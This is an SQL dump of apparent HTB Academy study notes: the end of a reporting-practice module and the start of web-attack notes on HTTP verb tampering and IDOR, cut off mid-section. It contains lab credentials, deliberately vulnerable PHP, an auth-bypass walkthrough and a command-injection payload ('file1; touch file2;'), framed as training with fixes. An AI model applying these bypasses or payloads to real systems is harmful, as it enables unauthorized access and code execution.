This hands-on section puts everything from the module into practice. The scenario: you work for **Acme Security, Ltd.**, and your team has been hired to perform an Internal Penetration Test against part of Inlanefreight''s internal network. The original tester assigned to the project had to leave unexpectedly, so you''ve been asked to take over using only the notes they left behind on the testing VM. The agreed scope is:

```text
Network range: 172.16.5.0/24
Domain:        INLANEFREIGHT.LOCAL
```

Your (absent) teammate already built a directory structure and a detailed Obsidian notebook, and identified **13 findings total**, but only recorded full evidence for a few of them — meaning part of your job is gathering the missing evidence yourself.

## 7.2 Lab Tasks to Practice

The lab recommends working through the following tasks to fully simulate a real internal penetration test:

- Set up **Tmux logging** (see [Section 2.3](#23-logging-tmux-logging-setup) above) and record all evidence through Tmux to get comfortable with the workflow.
- Enumerate and exploit **all 13 findings**, gathering any missing evidence yourself.
- Keep a detailed **Activity Log** of everything performed.
- Update the **Payload Log** as needed for anything you upload/drop on the target.
- Log all scan/tool output generated while gathering enumeration and finding evidence.
- Practice writing up the findings using either **WriteHat** or the provided report template (or both).
- Finish the assessment and answer the module''s questions to conclude it.

**Connecting to the lab VM** (same pattern as Section 2.12 above):
```bash
xfreerdp /v:<target-IP> /u:htb-student /p:HTB_@cademy_stdnt!
```

Because the lab environment **resets and wipes all progress**, make local copies of anything you want to keep for future practice — such as your own sample report, which you can also compare against the official sample report provided in the module''s Resources tab. Completing this practice lab fully (plus doing the same for the `Attacking Enterprise Networks` module) is strongly recommended as preparation for any HTB Academy exam that requires a written report submission.

---

# 8. Beyond this Module

## 8.1 Practicing

Documentation and reporting are soft skills that only improve with deliberate practice. The module suggests several concrete ways to keep building this skill over time:

- Practice with different notetaking tools while working through active/retired HTB boxes, Endgames, Pro Labs, and other Academy modules — record enumeration, exploitation, post-exploitation, findings, and scans in detail.
- Treat individual boxes/labs as if they were real client engagements and write up a full professional report using a template (the module''s own template, templates found on GitHub, or ones bundled with tools like WriteHat/Pwndoc).
- Read through publicly available sample pentest reports (e.g. in public GitHub "pentest reports" repositories) to see different reporting styles.
- If you don''t have time for a full report every time, at minimum pick 1–2 vulnerabilities per box/lab and write them up as proper findings — over time this builds your own personal findings database.
- Start a personal blog documenting walkthroughs of retired HTB boxes, challenges, tier-0 modules, or CTFs — even writing about topics others have already covered is good practice, and a solid blog can be a strong addition to a job application.
- Share your writing with friends/peers and actively ask for feedback.
- Read other people''s blogs regularly to see different ways of explaining the same concepts and findings.
- Use **GitHub Pages** with a Git workflow to document personal projects — this builds Git familiarity alongside documentation skills.

## 8.2 Next Steps

After finishing this module, the recommended path is to complete the **Penetration Testing Process** module (if not already done) to understand how every module in the Penetration Tester path connects together, and then complete **Attacking Enterprise Networks** — considered the capstone module of the path, simulating a full External Penetration Test that results in internal compromise. Approach that module as a real-world engagement and apply everything learned here about documentation and reporting while working through it.

---

# 9. Bonus: Creating Proper CTF Documentation (PDF-Ready)

This section was added beyond the original HTB module content to directly answer a common need: **how to turn your notes into a clean, professional PDF report you can submit for a CTF, an HTB Academy exam, or a certification practical exam** — following the same tone and structure as a real pentest report.

## 9.1 Why You Should Document CTFs Like a Real Pentest

Treating every CTF box or lab like a real client engagement (rather than just "I got root, moving on") builds the exact muscle memory you need for exams like OSCP, CPTS, or any engagement requiring a deliverable report. Graders and real clients both care about the same three things: **can they understand what you found, can they reproduce it, and can they act on your recommendation.** Writing this way from day one also means you naturally build a personal findings database over time (see [Section 8.1](#81-practicing)), which saves enormous time on future real-world reports.

## 9.2 Suggested CTF Report / Writeup Structure

A simplified version of the full professional report structure (from [Section 4](#4-components-of-a-report)) that works well for a single CTF box or exam target:

1. **Executive Summary** — a short, non-technical paragraph on the overall result and risk level (even for a CTF, practice writing this in plain English).
2. **Scope** — target IP(s)/hostname, assumed access level (black/grey/white box).
3. **Attack Narrative / Attack Chain** — the step-by-step story from initial access to full compromise, exactly like [Section 4.2](#42-writing-an-attack-chain).
4. **Findings** — one write-up per vulnerability using the structure from [Section 5.1](#51-breakdown-of-a-finding) (description, impact, affected host, recommendation, references, reproduction steps).
5. **Proof Screenshots/Output** — flag captures, shell access proof, privilege escalation proof.
6. **Recommendations** — how each issue should be fixed, written the "good" way shown in [Section 5.3](#53-effective-remediation-recommendations).

## 9.3 Example Markdown Template You Can Copy

Below is a ready-to-use Markdown skeleton you can paste into a new `.md` file for any box or CTF target, then fill in as you go:

```markdown
# <Target Name> — Penetration Test Report

## Executive Summary
Brief, non-technical summary of what was found and overall risk.

## Scope
- Target: 10.10.10.X
- Type: Internal / External / CTF
- Access level: Black box / Grey box / White box

## Attack Narrative
1. Initial recon findings
2. Foothold gained via ...
3. Privilege escalation via ...
4. Final access level achieved

## Findings

### [H1] Finding Title Here
**Severity:** High
**Affected Host(s):** 10.10.10.X
**Description:** What the issue is and why it exists.
**Impact:** What an attacker could do with this.
**Reproduction Steps:**
1. Step one with command
2. Step two with command
**Evidence:**
(screenshot or terminal output here)
**Recommendation:** Clear, actionable fix.
**References:**
- [Link title](https://example.com)

## Recommendations Summary
- Short-term fixes
- Long-term fixes

## Appendix
- Full tool output
- Credentials found (redacted)
```

## 9.4 Turning Your Markdown Notes into a PDF — Step by Step

Once your `.md` notes are complete, you have several ways to export them to a clean PDF. Below are the most common step-by-step methods.

### Method 1 — Using Pandoc (command line, most flexible)

**Step 1 — Install Pandoc and a LaTeX engine** (needed to actually render the PDF):
```bash
sudo apt update
sudo apt install pandoc texlive-latex-base texlive-fonts-recommended texlive-latex-extra
```

**Step 2 — Convert your Markdown file into a PDF:**
```bash
pandoc Documentation_and_Reporting_Notes.md -o report.pdf
```
This reads the Markdown file and outputs a formatted `report.pdf` in the same folder.

**Step 3 (optional) — Add a title page and table of contents automatically:**
```bash
pandoc Documentation_and_Reporting_Notes.md -o report.pdf --toc -V title="My CTF Report" -V author="Your Name"
```
The `--toc` flag auto-generates a clickable table of contents, and the `-V` flags set metadata like the title and author shown on the cover.

### Method 2 — Using VS Code (GUI, beginner-friendly)

**Step 1 — Install VS Code** and open your `.md` file.

**Step 2 — Install the "Markdown PDF" extension** from the Extensions marketplace (search `Markdown PDF` by yzane).

**Step 3 — Export to PDF.** Right-click inside the open Markdown file and select **"Markdown PDF: Export (pdf)"**. The extension renders the file (including code blocks) and saves a `.pdf` next to your `.md` file automatically.

### Method 3 — Using Typora (GUI, best for live preview + styling)

**Step 1 — Install Typora** and open your `.md` file — it renders Markdown live as you type, so you can see exactly how headings, code blocks, and tables will look.

**Step 2 — Choose a theme** (File → Preferences → Appearance) if you want a more polished visual style for your PDF export.

**Step 3 — Export to PDF.** Go to **File → Export → PDF**. Typora converts the current document straight to a styled PDF, keeping your headings, code blocks, and tables intact.

### Method 4 — Using Obsidian (if you''re already keeping your CTF notes there)

**Step 1 — Open the note** you want to export inside your Obsidian vault.

**Step 2 — Open the command palette** with `Ctrl+P` (or `Cmd+P` on Mac).

**Step 3 — Run the export command.** Type `Export to PDF` and select it. Obsidian renders the note (including embedded images and code blocks) directly to a PDF file you choose a save location for.

## 9.5 Tips for HTB Academy / Exam Report Submissions

- Keep a **separate findings folder per host/box**, following the same structure shown in [Section 2.7](#27-storage--folder-structure), so nothing gets lost when writing the final report.
- **Redact** any shared/reused lab credentials the same way you would for a real client (see [Section 2.10](#210-terminal-redaction)) — good habit-building even when it''s "just" a lab.
- Use the **same Attack Chain style** from [Section 4.2](#42-writing-an-attack-chain) even for a single-box CTF — graders specifically look for a clear narrative, not just a list of commands.
- Always include **both** the command run and its relevant output in your evidence — a command alone or output alone is not enough to prove reproducibility.
- Before exporting to PDF, do a **final QA pass** as described in [Section 6.7](#67-presenting-your-report--qa-process) — check spelling, verify every screenshot is legible, and confirm your table of contents links/anchors actually work after conversion.
- If the exam or exercise requires a specific report template (common for OSCP-style exams), always export your final notes **into that required template** rather than submitting your raw personal notes format — the structure requirement is usually graded separately from the technical content itself.

---

*End of notes. This file was structured as personal study notes based on the HTB Academy "Documentation & Reporting" module (Sections 1–8) plus a bonus CTF-documentation guide. Nothing from the original module content was skipped or overwritten — every heading and subheading from the source sections has been preserved.*', NULL, 'PUBLISHED', 'PUBLIC', 59, 'cmvcsa9i0000hidr0sh1y58oz', 'cmvcr40dj0000idhkp489xa3k', to_timestamp(1792439278.634), to_timestamp(1792439278.634), NULL, NULL)
ON CONFLICT ("slug") DO UPDATE SET "title" = EXCLUDED."title", "contentMarkdown" = EXCLUDED."contentMarkdown", "contentHtml" = EXCLUDED."contentHtml", "description" = EXCLUDED."description", "status" = EXCLUDED."status", "updatedAt" = EXCLUDED."updatedAt";
INSERT INTO "Document" ("id", "title", "slug", "description", "contentMarkdown", "contentHtml", "status", "visibility", "readingTimeMin", "categoryId", "authorId", "createdAt", "updatedAt", "publishedAt", "deletedAt")
VALUES ('cmvfop7mb00b2ida0onfzsxbt', 'Web Attacks: HTTP Verb Tampering, IDOR & XXE Injection', 'web-attacks-http-verb-tampering-idor-xxe-injection', 'Detect, exploit, and prevent three core web attacks — HTTP Verb Tampering, IDOR, and XXE Injection — with step-by-step commands and a full HTB challenge chain writeup ending in a captured flag.', '# Web Attacks — Structured Notes

---

## Table of Contents

**1. Introduction to Web Attacks**

- 1.1 Web Attacks Covered in This Module

---

**2. HTTP Verb Tampering**

- 2.1 Intro to HTTP Verb Tampering
  - 2.1.1 HTTP Verbs — Overview Table
- 2.2 Insecure Configurations
- 2.3 Insecure Coding
  - 2.3.1 How the Vulnerability Occurs
  - 2.3.2 Breaking Down the Problem
  - 2.3.3 How an Attacker Exploits This
- 2.4 Bypassing Basic Authentication
  - 2.4.1 Identify
  - 2.4.2 Exploit
  - 2.4.3 Step-by-Step: How to Bypass Basic Authentication
- 2.5 Bypassing Security Filters
  - 2.5.1 Identify
  - 2.5.2 Exploit
  - 2.5.3 Step-by-Step: How to Bypass a Security Filter
- 2.6 Verb Tampering Prevention
  - 2.6.1 Fixing Insecure Server Configurations
  - 2.6.2 Fixing Insecure Coding

---

**3. Insecure Direct Object References (IDOR)**

- 3.1 Intro to IDOR
  - 3.1.1 Impact of IDOR Vulnerabilities
- 3.2 Identifying IDORs
  - 3.2.1 URL Parameters & APIs
  - 3.2.2 AJAX Calls in JavaScript
  - 3.2.3 Understanding Hashed or Encoded References
  - 3.2.4 Comparing User Roles
- 3.3 Mass IDOR Enumeration
  - 3.3.1 Insecure Parameters
  - 3.3.2 Identifying the IDOR
  - 3.3.3 Step-by-Step: Mass Enumeration with Bash
- 3.4 Bypassing Encoded References
  - 3.4.1 Identify
  - 3.4.2 Function Disclosure
  - 3.4.3 Verify the Hash
  - 3.4.4 Mass Enumeration
- 3.5 IDOR in Insecure APIs
  - 3.5.1 Identifying Insecure APIs
  - 3.5.2 Exploiting Insecure APIs
- 3.6 Chaining IDOR Vulnerabilities
  - 3.6.1 Information Disclosure
  - 3.6.2 Modifying Other Users'' Details
  - 3.6.3 Chaining Two IDOR Vulnerabilities
- 3.7 IDOR Prevention
  - 3.7.1 Object-Level Access Control (RBAC)
  - 3.7.2 Object Referencing

---

**4. XML External Entity (XXE) Injection**

- 4.1 Intro to XXE
  - 4.1.1 XML Basics
  - 4.1.2 XML DTD (Document Type Definition)
  - 4.1.3 XML Entities
- 4.2 Local File Disclosure
  - 4.2.1 Identifying
  - 4.2.2 Step-by-Step: Exploiting XXE to Read Local Files
  - 4.2.3 Remote Code Execution via XXE
  - 4.2.4 Other XXE Attacks
- 4.3 Advanced File Disclosure
  - 4.3.1 Advanced Exfiltration with CDATA
  - 4.3.2 Error-Based XXE
- 4.4 Blind Data Exfiltration
  - 4.4.1 Out-of-Band Data Exfiltration
  - 4.4.2 Automated OOB Exfiltration with XXEinjector
- 4.5 XXE Prevention
  - 4.5.1 Avoiding Outdated Components
  - 4.5.2 Using Safe XML Configurations
  - 4.5.3 Additional Recommendations

---

**5. HTB Web Challenge Writeup**

- 5.1 Overview
- 5.2 Step 1: User Enumeration via IDOR
- 5.3 Step 2: Token IDOR — Steal Admin''s Reset Token
- 5.4 Step 3: HTTP Verb Tampering — Bypass Auth on reset.php
  - 5.4.1 Discovery — Reading settings.php Source Code
  - 5.4.2 How the Reset Flow Works
  - 5.4.3 The Problem
  - 5.4.4 The Bypass
- 5.5 Step 4: Login as Administrator
- 5.6 Step 5: XXE Injection on /addEvent.php
  - 5.6.1 Discovery
  - 5.6.2 Payload
- 5.7 Step 6: Decode the Flag
- 5.8 Flag
- 5.9 Vulnerability Summary
- 5.10 Key Takeaways

---

## Introduction to Web Attacks

Web applications are used by almost every business today, making their security extremely important. As web apps grow more complex, attackers also develop more advanced techniques to exploit them. This creates a large attack surface, making web attacks the most common type of attack against companies. Protecting web applications has become a top priority for any IT or security team.

Attacking external-facing web applications can lead to compromise of a company''s internal network, resulting in stolen data, disrupted services, or serious financial damage. Even companies without public-facing web apps usually have internal ones or API endpoints — both of which are just as vulnerable and can be exploited for the same goals.

### Web Attacks Covered in This Module

This module focuses on three major web attack types that are commonly found across web applications:

- **HTTP Verb Tampering** — abuses servers that accept extra HTTP methods (like HEAD or PUT) to bypass authentication or security filters.
- **Insecure Direct Object References (IDOR)** — abuses missing back-end access control to read or change other users'' data by changing an ID or reference.
- **XML External Entity (XXE) Injection** — abuses unsafe XML parsing to read local files, steal credentials, or reach remote code execution.

For each attack, the module explains how to **detect** it, how to **exploit** it, and how to **prevent** it.

---

## Section 1: HTTP Verb Tampering

---

### Intro to HTTP Verb Tampering

The HTTP protocol works by accepting different HTTP methods (also called verbs) at the start of each request. Web applications are often configured to accept only specific methods like GET and POST, and they perform different actions depending on which method is used.

If a web application or server is not configured to restrict which HTTP methods it accepts, an attacker can send unusual or unexpected HTTP methods. This can lead to bypassing security controls, accessing restricted functions, or triggering server errors. The vulnerability arises from a mismatch between what the server accepts and what the application is coded to handle.

HTTP supports **9 verbs** in total. Most developers only plan for GET and POST, but a client can send any of the others and watch how the server reacts. If both the server and the app only expect GET/POST, an extra method usually just shows an error page (a minor issue). The real danger appears when the server accepts extra methods **and** the app does not handle them safely — that gap is what verb tampering exploits.

#### HTTP Verbs — Overview Table

| Verb    | Description                                                 |
| ------- | ----------------------------------------------------------- |
| GET     | Retrieves data from the server                              |
| POST    | Sends data to the server (e.g. form submissions)            |
| HEAD    | Same as GET but only returns headers, not the response body |
| PUT     | Writes/uploads data to a specified location on the server   |
| DELETE  | Deletes a resource at the specified location                |
| OPTIONS | Lists the HTTP methods accepted by the server               |
| PATCH   | Applies partial modifications to a resource                 |

Some of these verbs like PUT and DELETE can be very dangerous if the server allows them without proper restrictions, as they can be used to write or delete files directly on the server. What makes verb tampering so common and critical is that it comes from a **misconfiguration** in either the server or the app — either one alone is enough to create the bug.

---

### Insecure Configurations

The first type of HTTP Verb Tampering vulnerability comes from **insecure web server configurations**. When a server''s authentication rules only apply to certain HTTP methods (like GET and POST), other methods like HEAD or OPTIONS may still be accessible without any authentication at all.

For example, an Apache server might have a config like this:

```xml
<Limit GET POST>
    Require valid-user
</Limit>
```

This config only protects GET and POST requests. An attacker can still send a HEAD request and completely bypass the authentication check. This is a classic configuration mistake that leads to **authentication bypass**, allowing access to restricted web pages or admin panels without valid credentials. The lesson is that naming specific verbs in an auth rule is dangerous, because every verb you forget to list stays unprotected.

---

### Insecure Coding

The second type of HTTP Verb Tampering vulnerability comes from **mistakes in the application''s source code**. Developers sometimes write security filters that only check one HTTP method (e.g. GET), while the actual function uses a broader parameter that covers multiple methods. This inconsistency is what attackers exploit — the filter is bypassed simply by switching the HTTP method, even though the underlying vulnerable function still runs.

#### How the Vulnerability Occurs

Suppose a web page was found to be vulnerable to **SQL Injection**, and a developer tried to fix it by adding an input sanitization filter. The filter looks like this:

```php
$pattern = "/^[A-Za-z\s]+$/";

if(preg_match($pattern, $_GET["code"])) {
    $query = "Select * from ports where port_code like ''%" . $_REQUEST["code"] . "%''";
    ...SNIP...
}
```

At first glance this looks like a fix — the `preg_match` function checks the input against a pattern that only allows letters and spaces. But there is a critical mistake hidden here.

#### Breaking Down the Problem

| Part of Code                | What It Does                                | The Problem                              |
| --------------------------- | ------------------------------------------- | ---------------------------------------- |
| `$_GET["code"]`             | Reads the input from the GET parameter      | Only GET is being checked by the filter  |
| `preg_match($pattern, ...)` | Validates input — blocks special characters | Only runs on GET, not POST               |
| `$_REQUEST["code"]`         | Used in the actual SQL query                | Accepts **both** GET and POST parameters |

The filter checks `$_GET["code"]` — meaning it only validates the GET version of the parameter. But the SQL query uses `$_REQUEST["code"]`, which in PHP covers **both GET and POST** parameters. This creates a dangerous inconsistency.

#### How an Attacker Exploits This

An attacker can switch the request method from GET to POST and send their malicious SQL payload in the POST body instead:

- The `$_GET["code"]` parameter will be **empty** — no special characters, so the filter passes.
- The `$_REQUEST["code"]` parameter will pick up the **POST value** — which contains the malicious payload.
- The SQL query executes with the injected input, making the application **vulnerable to SQL Injection** despite having a filter in place.

This is the core issue: the filter protects one method, but the function reads from all methods. Switching methods bypasses the protection entirely without touching the actual vulnerability. Of the two verb-tampering types, this coding mistake is far more common, because secure configuration is well documented while coding slips happen easily and often survive to production.

---

### Bypassing Basic Authentication

Exploiting HTTP Verb Tampering is usually a straightforward process. The idea is to try different HTTP methods and observe how the server responds to each one. Automated tools can detect configuration-based Verb Tampering easily, but code-based Verb Tampering usually requires manual testing to identify and exploit properly.

This type of vulnerability is mainly caused by **Insecure Web Server Configurations**, and exploiting it can allow us to bypass the HTTP Basic Authentication prompt on certain pages entirely — without needing any valid credentials.

#### Identify

When we open the target web application, we see a basic **File Manager** that lets us add new files by typing their names and pressing Enter. Everything looks normal at first.

However, when we click the red **Reset** button to delete all files, the application immediately shows an **HTTP Basic Auth prompt** — meaning this function is restricted to authenticated users only. Since we have no credentials, submitting without them gives us a `401 Unauthorized` page.

To plan our attack, we need to figure out exactly what is restricted. We look at the URL the Reset button points to: `/admin/reset.php`. This could mean either the full `/admin/` directory is protected, or just that one file. We test by visiting `/admin/` directly — and we get the same login prompt. This confirms that the **entire `/admin/` directory is locked behind authentication**.

#### Exploit

Now that we know what is restricted, we move to exploitation. We need to identify the HTTP request method the application is using, then try alternative methods that the server may not have covered in its authentication rules.

#### Step-by-Step: How to Bypass Basic Authentication

**Step 1 — Identify the restricted page**

Try accessing a restricted page (e.g. `/admin/reset.php`) and see if you get a login prompt or a `401 Unauthorized` error. This tells you which pages require authentication.

**Step 2 — Check the request method**

Intercept the request using Burp Suite and check whether it uses GET or POST. This is the method currently being protected by authentication. In this exercise the Reset button sends a **GET** request. Trying to change it to **POST** (Burp → right-click → **Change Request Method**) still returns the login prompt and a 401, which means the server protects **both** GET and POST.

**Step 3 — Check what methods the server accepts**

Use `curl` to send an OPTIONS request and see which methods the server allows:

```shellsession
curl -i -X OPTIONS http://SERVER_IP:PORT/
```

Command explained step by step:
- `curl` is a command-line tool that sends HTTP requests.
- `-i` **includes the response headers** in the output, so we can read the `Allow:` line.
- `-X OPTIONS` sets the request **method to OPTIONS**, which asks the server to list the verbs it accepts.
- `http://SERVER_IP:PORT/` is the target address.

Example response:

```
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
Allow: POST,OPTIONS,HEAD,GET
Content-Length: 0
```

This tells you that the server also accepts **HEAD** requests (which is the default for many web servers).

**Step 4 — Send a HEAD request**

Change the request method to HEAD (using Burp''s "Change Request Method") and forward it. Since authentication is only enforced on GET and POST, the HEAD request will pass through without prompting for a login. HEAD behaves like GET but returns **no response body**, so we expect empty output.

**Step 5 — Confirm the bypass**

Even though a HEAD request returns no response body, the server-side function still executes. For example, a Reset function would still run and delete all files — confirming that authentication was bypassed successfully. Going back to the File Manager shows all files are gone, with **no admin access and no credentials**. Try other methods too, to see which ones also bypass the prompt.

---

### Bypassing Security Filters

This is the second — and more common — type of HTTP Verb Tampering. It occurs when a web application''s **security filter only checks one HTTP method**, leaving other methods unprotected.

This vulnerability is caused by **Insecure Coding** errors made during development, where the developer did not cover all HTTP methods in their security filter logic. This is very commonly found in filters that detect injection attacks — if the filter only checks POST parameters (e.g. `$_POST[''parameter'']`), an attacker can simply switch the request to GET and bypass the filter entirely.

#### Identify

In the **File Manager** web application, if we try to create a file with special characters in its name (e.g. `test;`), the application blocks the request and shows an error message indicating that a malicious request was detected. This tells us that a **back-end security filter** is in place that identifies injection attempts and blocks them.

No matter what special characters or patterns we try, the filter keeps blocking us. The application appears secure against injection. However, this filter may only be checking one HTTP method — which is our opening for a Verb Tampering attack.

#### Exploit

To try and exploit this vulnerability, we intercept the request in **Burp Suite** and use **"Change Request Method"** to switch it to a different method (e.g. from POST to GET).

This time, the `Malicious Request Denied!` message does not appear — our file is created successfully. This confirms the filter is not covering all HTTP methods.

To fully confirm the bypass and prove Command Injection is possible, we inject a command as the filename: `file1; touch file2;`. We change the request method again and send it. If **both `file1` and `file2` are created** on the server, we have successfully achieved Command Injection through the Verb Tampering bypass.

Here `file1;` ends the first command and `touch file2;` is the injected command that creates a second file. Seeing both files appear proves the injected command ran. This also proves that without the HTTP Verb Tampering vulnerability, the web application may have been secure against Command Injection — but the filter bypass opened the door to it completely.

#### Step-by-Step: How to Bypass a Security Filter

**Step 1 — Identify the filter**

Try submitting a request with special characters (e.g. `test;`). If the server blocks it with a message like `Malicious Request Denied!`, a security filter is in place.

**Step 2 — Change the request method**

Intercept the request in Burp Suite and use "Change Request Method" to switch from POST to GET (or vice versa). Send the modified request.

**Step 3 — Observe the result**

If the filter only checks POST parameters, a GET request with the same payload may pass through without triggering the filter. This confirms a Verb Tampering vulnerability.

**Step 4 — Exploit the underlying vulnerability**

Now try injecting a command using the bypassed method. For example, use the filename `file1; touch file2;` as a GET parameter. If both files are created on the server, you''ve confirmed **Command Injection** through Verb Tampering.

---

### Verb Tampering Prevention

Preventing HTTP Verb Tampering requires fixing both server configurations and application code. The key idea is to make sure security rules apply to **all HTTP methods**, not just a specific one or two.

#### Fixing Insecure Server Configurations

Vulnerable configurations restrict authentication only to specific methods. Here are examples across different web servers and how to fix them:

**Apache — vulnerable config:**

```xml
<Limit GET>
    Require valid-user
</Limit>
```

**Fix:** Use `LimitExcept` instead, which covers all methods *except* the listed ones:

```xml
<LimitExcept GET POST>
    Require valid-user
</LimitExcept>
```

Note: `LimitExcept` flips the logic — it applies the rule to every verb that is **not** named, so forgotten verbs like HEAD or PUT are covered automatically instead of left open.

**Tomcat (`web.xml`) — vulnerable:**

```xml
<http-method>GET</http-method>
```

**Fix:** Use `http-method-omission` to cover all other methods. For example, `<http-method-omission>GET</http-method-omission>` applies the constraint to every method except GET, closing the gap.

**ASP.NET (`web.config`) — vulnerable:**

```xml
<allow verbs="GET" roles="admin">
<deny verbs="GET" users="*">
```

**Fix:** Use `add/remove` directives that cover all verbs, not just GET.

As a general rule, **always disable or deny HEAD requests** unless your application specifically requires them, since they are the most commonly abused method in bypass attacks.

#### Fixing Insecure Coding

Insecure code uses inconsistent HTTP parameter variables across functions. The fix is to **use the same parameter type everywhere** — especially in security-critical functions:

| Language | Secure Function to Use          |
| -------- | ------------------------------- |
| PHP      | `$_REQUEST[''param'']`            |
| Java     | `request.getParameter(''param'')` |
| C#       | `Request[''param'']`              |

By ensuring that both the security filter and the actual function use the same HTTP parameter scope, you eliminate the inconsistency that attackers exploit. The goal is that if a parameter is checked, it is checked no matter which HTTP method delivered it.

---

## Section 2: Insecure Direct Object References (IDOR)

---

### Intro to IDOR

IDOR (Insecure Direct Object References) is one of the most common web vulnerabilities. It happens when a web application exposes a direct reference to an internal object — like a file ID or database record — and the user can manipulate that reference to access other objects they shouldn''t have access to.

The core cause of IDOR is a **weak or missing access control system on the back-end**. When the back-end doesn''t verify whether a user is actually allowed to access a specific resource, an attacker can simply guess or change the ID to access someone else''s data. These vulnerabilities are hard to detect automatically, which is why they often make it into production even in large applications like Facebook and Instagram.

It is worth stressing that exposing a direct reference is **not** a vulnerability by itself. The real problem is the missing access control behind it. Many apps only hide resources on the front-end (by not showing the links), but if the back-end never checks permissions, editing the HTTP request directly reveals that every user can reach everyone''s data.

#### Impact of IDOR Vulnerabilities

IDOR vulnerabilities can have serious consequences depending on what kind of objects are exposed:

- **IDOR Information Disclosure** — Accessing private files, personal records, or financial data of other users.
- **IDOR Insecure Function Calls** — Calling admin-only APIs or functions with a regular user account to perform unauthorized actions like changing passwords or granting roles.
- **Account Takeover** — By modifying another user''s email via IDOR and then triggering a password reset, an attacker can fully take over an account.
- **Privilege Escalation** — Changing your own role from `employee` to `admin` if the back-end doesn''t validate the role server-side.

---

### Identifying IDORs

Finding IDOR vulnerabilities requires carefully examining how the application references objects and whether the back-end enforces proper access checks on those references.

#### URL Parameters & APIs

The first place to look is URL parameters and API calls. When you receive a file or data, check the URL for patterns like `?uid=1` or `?filename=file_1.pdf`. These are direct object references. Try incrementing the value (`?uid=2`) to see if you can access another user''s data. You can also use fuzzing tools to try thousands of values automatically. These references may also hide in other places such as cookies or HTTP headers, so check the full request, not just the URL.

#### AJAX Calls in JavaScript

Web applications built with JavaScript frameworks (React, Angular, Vue) sometimes include all function calls in the front-end code — even admin-only ones. If you inspect the JavaScript source, you may find AJAX calls that reference APIs with direct object IDs. These can be tested for IDOR even if they''re never triggered during normal use.

For example, if we do not have an admin account, only user-level functions would be used in the app, while admin functions would be disabled or hidden. However, those admin functions may still exist in the front-end JavaScript code. If we find AJAX calls in the source that reference specific endpoints or APIs with direct object references, we can test them for IDOR — even if the app never calls them for our role.

```javascript
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```

This function may never run for a normal user, but if you find it in the source, you can call it manually to test for IDOR. This is not limited to admin functions — any hidden or unused function calls that don''t appear in normal HTTP traffic could expose IDOR vulnerabilities. We can do the same with back-end code if we have access to it (e.g. in open-source web applications).

#### Understanding Hashed or Encoded References

Some applications encode references using Base64 or hash them with MD5 instead of using plain sequential numbers. Even if the reference looks complex or random, it may still be exploitable if there is no proper access control on the back-end.

**Base64 Encoded References**

If you see a URL parameter like `?filename=ZmlsZV8xMjMucGRm`, the character set is a strong hint that it''s Base64-encoded. Decode it to get the original value (e.g. `file_123.pdf`), change it to another value (e.g. `file_124.pdf`), re-encode it, and use the new encoded value in the request. If you get back data, the app is vulnerable to IDOR. You can decode and encode quickly on the command line:

```shellsession
echo -n "ZmlsZV8xMjMucGRm" | base64 -d      # decode  → file_123.pdf
echo -n "file_124.pdf" | base64             # re-encode a new value
```

- `echo -n` prints the text with **no trailing newline** (a newline would corrupt the decode/encode).
- `base64 -d` **decodes** Base64; `base64` with no flag **encodes**.

**Hashed References**

A reference like `download.php?filename=c81e728d9d4c2f636f067f89cc14862c` may look secure at first since it''s not in plain text. However, if the hashing is done on the front-end (in JavaScript), the logic is fully visible to anyone who reads the source code. For example:

```javascript
$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5(''file_1.pdf'').toString()},
    success:function(result){
        //
    }
});
```

Here the app is MD5-hashing the filename directly. Since we can see exactly what''s being hashed, we can calculate the hash for any other filename ourselves and use it to request files that don''t belong to us. If the hash algorithm is not visible in the source, use a hash identifier tool to figure out the algorithm, then hash filenames manually to match and replicate the pattern.

#### Comparing User Roles

For more advanced IDOR attacks, register multiple user accounts and compare their HTTP requests and object references side by side. This helps you understand how the application calculates its URL parameters and unique identifiers, and lets you replicate those calculations for other users to access their data.

For example, suppose User 1 can view their salary by making an API call that returns:

```json
{
  "attributes": {
    "type": "salary",
    "url": "/services/data/salaries/users/1"
  },
  "Id": "1",
  "Name": "User1"
}
```

User 2 may not have access to the same API parameters and normally cannot replicate this call. However, with the details captured from User 1, you can log in as User 2 and send the exact same API request. If the back-end only checks that a valid session exists — but does not verify that the session belongs to the user whose data is being requested — the API will return User 1''s salary data to User 2. This is a clear IDOR vulnerability caused by a missing back-end access control check.

---

### Mass IDOR Enumeration

Once you confirm an IDOR vulnerability, you can automate the process to extract data from many users at once instead of doing it manually one by one. Exploiting IDOR vulnerabilities can be easy in some cases but very challenging in others. For basic attacks, simple techniques are enough. For advanced attacks, you need to understand how the app calculates object references and how its access control system works before you can enumerate at scale.

#### Insecure Parameters

Let''s walk through a real example using an **Employee Manager** web application. When logged in as `uid=1` and navigating to the Documents page, the URL becomes:

```
/documents.php?uid=1
```

The page shows documents belonging to the current user, with file names like:

```
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```

The file names follow a predictable pattern — **user UID + month/year**. This is the most basic type called **Static File IDOR**. You could try fuzzing file names directly, but that only works if you know the prefix (e.g. `Invoice` or `Report`) and would miss other file types. A better approach is to manipulate the `uid` parameter in the URL directly.

#### Identifying the IDOR

Change the URL parameter from `?uid=1` to `?uid=2`. The page may look identical at first glance — same layout, same section headings. However, always check the actual file links in the page source, not just the page appearance. The linked files will be different:

```
/documents/Invoice_2_08_2020.pdf
/documents/Report_2_12_2020.pdf
```

These are another employee''s files — confirming the IDOR vulnerability. The app is using the `uid` GET parameter as a direct reference to the database records, with no back-end access control checking whether you are allowed to view that user''s data. Another common variant uses a filter parameter like `uid_filter=1` — which can also be changed to another user''s ID, or removed entirely to show all users'' documents at once.

#### Step-by-Step: Mass Enumeration with Bash

Manually changing the `uid` one by one is not practical in a real environment with hundreds or thousands of employees. Instead, we automate it with a bash script.

**Step 1 — View the HTML source of the documents page**

Press `CTRL+SHIFT+C` in Firefox to open the element inspector, then click any document link to view its HTML. You will see links structured like this:

```html
<li class=''pure-tree_link''><a href=''/documents/Invoice_3_06_2020.pdf'' target=''_blank''>Invoice</a></li>
<li class=''pure-tree_link''><a href=''/documents/Report_3_01_2020.pdf'' target=''_blank''>Report</a></li>
```

**Step 2 — Use curl and grep to extract file links**

First you can grep by a unique string that every link shares (`<li class=''pure-tree_link''>`):

```shellsession
